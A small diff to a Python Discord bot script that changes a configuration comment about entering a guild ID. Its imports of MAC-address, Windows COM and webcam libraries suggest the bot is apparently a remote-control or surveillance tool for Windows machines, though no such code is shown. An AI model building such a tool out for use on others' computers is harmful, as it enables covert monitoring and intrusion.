@@ -14,7 +14,7 @@ from getmac import get_mac_address as gma
 import comtypes, win32com.client as wincl, pygame, pygame.camera
 
 TOKEN = ""
-main_guild_id = [] # remove the brackets when putting your guild id
+main_guild_id = [] # remove the brackets when putting your guild id (don't put quotes either........... it should be like: main_guild_id = 1234123412 )
 
 activity=discord.Game("I can't code for shit")
 client = commands.Bot(command_prefix = 'g!', Intents=Intents.default() , case_insensitive=True, activity=activity, status=discord.Status.idle)
